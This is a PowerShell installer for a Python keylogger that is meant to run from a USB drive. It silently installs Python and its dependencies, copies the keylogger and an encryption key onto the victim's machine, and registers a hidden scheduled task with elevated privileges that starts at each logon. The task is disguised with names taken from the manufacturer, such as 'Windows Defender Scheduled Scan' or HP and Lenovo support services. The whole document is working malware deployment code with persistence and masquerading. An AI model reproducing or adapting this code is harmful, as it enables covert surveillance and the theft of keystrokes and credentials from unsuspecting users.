# Set the USB drive path (Assumes script is run from the USB root)
$usbPath = Split-Path -Parent $MyInvocation.MyCommand.Path
# Define target directory for copying the keylogger and public key
$targetDir = "C:\Users\$env:USERNAME\Downloads\"  # Use %USERNAME% variable for dynamic user path
# Define the expected file paths for the key pair
$publicKeyPath = "$usbPath\public_key.pem"  # Adjust according to actual file name
$privateKeyPath = "$usbPath\private_key.pem"  # Adjust according to actual file name

### --------------------------- Check System Info --------------------------- ###
# Check the PowerShell version
$psVersion = $PSVersionTable.PSVersion.Major
# Check if the script is running with administrator privileges
$adminCheck = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
$isAdmin = $adminCheck.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# Function to get Manufacturer and Model
function Get-ComputerInfo {
    if ($psVersion -lt 6) {
        # PowerShell version 5.1 or lower
        # $SystemManufacterer = Get-WmiObject -Class Win32_ComputerSystem
        $SystemManufacterer = (Get-WmiObject -Class Win32_ComputerSystem).Manufacturer

    } else {
        # PowerShell version 6 or newer
        # $SystemManufacterer = Get-CimInstance -ClassName Win32_ComputerSystem
        $SystemManufacterer = (Get-CimInstance -ClassName Win32_ComputerSystem).Manufacturer

    }
    
    # Write-Output "Manufacturer: $($SystemManufacterer)"
}

# Run the script based on admin privileges
if ($isAdmin) {
    Write-Output "Running as Administrator"
    Get-ComputerInfo
} else {
    Write-Output "Please run this script with Administrator privileges to access system information."
    # Attempt to retrieve the info without admin, if permissions allow
    try {
        Get-ComputerInfo
    } catch {
        Write-Output "Unable to retrieve system information without elevated permissions."
    }
}

### --------------------------- Check if all files are done --------------------------- ###
# Check if key pair exists
if ((Test-Path -Path $publicKeyPath) -and (Test-Path -Path $privateKeyPath)) {
    Write-Host "Key pair already exists. Skipping key generation."
} else {
    Write-Host "No key pair found. Generating new key pair..."
    python "$usbPath\key_gen.py"
    if ((Test-Path -Path $publicKeyPath) -and (Test-Path -Path $privateKeyPath)) {
        Write-Host "Key pair generated successfully."
    } else {
        Write-Host "Failed to generate key pair. Ensure key_gen.py is configured correctly."
        exit
    }
}

### --------------------------- Keylogger Setup --------------------------- ###
# Set up Python environment if necessary
function Get-PythonwPath {
    $pythonwPath = Get-Command pythonw -ErrorAction SilentlyContinue | ForEach-Object { $_.Source }
    if (-not $pythonwPath) {
        $registryPaths = @(
            "HKLM:\SOFTWARE\Python\PythonCore",
            "HKCU:\SOFTWARE\Python\PythonCore"
        )
        foreach ($path in $registryPaths) {
            $pythonRegPath = Get-ItemProperty -Path "$path\*\InstallPath" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty InstallPath -First 1
            if ($pythonRegPath) {
                $pythonwPath = Join-Path -Path $pythonRegPath -ChildPath "pythonw.exe"
                if (Test-Path -Path $pythonwPath) {
                    break
                }
            }
        }
    }
    return $pythonwPath
}

$pythonwPath = Get-PythonwPath
if (-not $pythonwPath) {
    Write-Host "Pythonw.exe not found. Installing Python..."
    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.13.0/python-3.13.0.exe" -OutFile "$usbPath\python_installer.exe"
    Start-Process -FilePath "$usbPath\python_installer.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
    Remove-Item "$usbPath\python_installer.exe" -Force
    $pythonwPath = Get-PythonwPath
    if (-not $pythonwPath) {
        Write-Host "Python installation failed. Exiting setup."
        exit
    }
    Write-Host "Python installed successfully."
} else {
    Write-Host "Pythonw.exe located at: $pythonwPath"
}

# Check if pip is installed
$pipInstalled = & $pythonwPath -m pip --version 2>&1 | Out-Null
if ($LASTEXITCODE -ne 0) {
    Write-Host "Pip not found. Installing pip..."
    Invoke-WebRequest -Uri "https://bootstrap.pypa.io/get-pip.py" -OutFile "$usbPath\get-pip.py"
    & $pythonwPath "$usbPath\get-pip.py"
    Remove-Item "$usbPath\get-pip.py" -Force
    Write-Host "Pip installed successfully."
} else {
    Write-Host "Pip is already installed."
}


# List of required Python packages for your script
$dependencies = @("pynput", "requests", "cryptography")
# Python executable path
$pythonPath = "C:\Users\$env:USERNAME\AppData\Local\Programs\Python\Python313\python.exe"
# Function to check if a package is installed
function Check-PythonDependency {
    param (
        [string]$packageName
    )
    $result = & $pythonPath -m pip show $packageName
    return $result -ne ""
}

# Loop through each dependency and install if not present
foreach ($package in $dependencies) {
    if (-not (Check-PythonDependency -packageName $package)) {
        Write-Output "$package is not installed. Installing..."
        & $pythonPath -m pip install $package
    } else {
        Write-Output "$package is already installed."
    }
}
Write-Output "Dependency check completed."

# Verify the existence of Python executable and keylogger script before scheduling
if (-not (Test-Path -Path $pythonwPath)) {
    Write-Host "Error: pythonw.exe not found at $pythonwPath. Exiting setup."
    exit
}

### --------------------------- Copy Keylogger and Public Key to Target Directory --------------------------- ###
# Copy keylogger and public key to the target directory
Write-Host "Copying keylogger and public key to target directory..."
New-Item -Path "$targetDir" -ItemType Directory -Force
Copy-Item -Path "$usbPath\key_log.py" -Destination $targetDir -Force
Copy-Item -Path $publicKeyPath -Destination $targetDir -Force
# check if key_log.py is copied
if (-not (Test-Path -Path "$targetDir\key_log.py")) {
    Write-Host "Error: key_log.py not found in target directory. Exiting setup."
    exit
}
### --------------------------- Scheduled Task Setup --------------------------- ###
# Set up a Scheduled Task to run the keylogger when the user logs in, hidden
$taskAction = New-ScheduledTaskAction -Execute "$pythonwPath" -Argument "$targetDir\key_log.py" -WorkingDirectory $targetDir
$taskTrigger = New-ScheduledTaskTrigger -AtLogon  # Trigger on user logon
$taskPrincipal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Highest
$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

### --------------------------- Register Scheduled Task Depending on the Systems SystemManufacterer --------------------------- ###
# Register the scheduled task under a specific folder (optional)
Get-ComputerInfo
$SystemManufacterer = (Get-WmiObject -Class Win32_ComputerSystem).Manufacturer
$SystemManufacterer = $SystemManufacterer.Trim().ToLower()
if ($SystemManufacterer -ieq "dell") {
    Write-Host "Manufacturer is Dell. Using DellTasks folder."
    $taskFolderPath = "\DellTasks"
    $taskName = "KeyLoggerTask"
} elseif ($SystemManufacterer -ieq "hp" -or $SystemManufacterer -ieq "Hewlett-Packard") {
    Write-Host "Manufacturer is HP. Using HP Support Assistant folder."
    $taskFolderPath = "\Hewlett-Packard\HP Support Assistant"
    $taskName = "HP Support Solutions Framework Integration Service"
} elseif ( $SystemManufacterer -ieq "lenovo") {
    Write-Host "Manufacturer is Lenovo. Using Lenovo folder."
    $taskFolderPath = "\Lenovo"
    $taskName = "Lenovo Solution Center"
} elseif ($SystemManufacterer -ieq "microsoft corporation") {
    Write-Host "Manufacturer is Microsoft. Using Microsoft folder."
    $taskFolderPath = "\Microsoft"
    $taskName = "Windows Defender Scheduled Scan"
} elseif ($SystemManufacterer -ieq "acer") {
    Write-Host "Manufacturer is Acer. Using Acer folder."
    $taskFolderPath = "\Acer"
    $taskName = "Acer Collection"
} elseif ($SystemManufacterer -ieq "asus") {
    Write-Host "Manufacturer is Asus. Using Asus folder."
    $taskFolderPath = "\Asus"
    $taskName = "Asus Collection"
} elseif ($SystemManufacterer -ieq "toshiba") {
    Write-Host "Manufacturer is Toshiba. Using Toshiba folder."
    $taskFolderPath = "\Toshiba"
    $taskName = "Toshiba Collection"    
} elseif ($SystemManufacterer -ieq "samsung") {
    Write-Host "Manufacturer is Samsung. Using Samsung folder."
    $taskFolderPath = "\Samsung"
    $taskName = "Samsung Collection"
} elseif ($SystemManufacterer -ieq "msi") {
    Write-Host "Manufacturer is MSI. Using MSI folder."
    $taskFolderPath = "\MSI"
    $taskName = "MSI Collection"
} else {
    Write-Host "Manufacturer not recognized. Using default folder."
    $taskFolderPath = "\Microsoft\Windows\LanguageComponentsInstaller"
    $taskName = "LanguageDetectionResources"
}

# Register the task with the new trigger (when user logs in)
Write-Host "Registering the task under $taskFolderPath"
Register-ScheduledTask -TaskName $taskName -TaskPath $taskFolderPath -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings
Write-Host "Keylogger setup to run when the user logs in."
Write-Host "Setup completed successfully."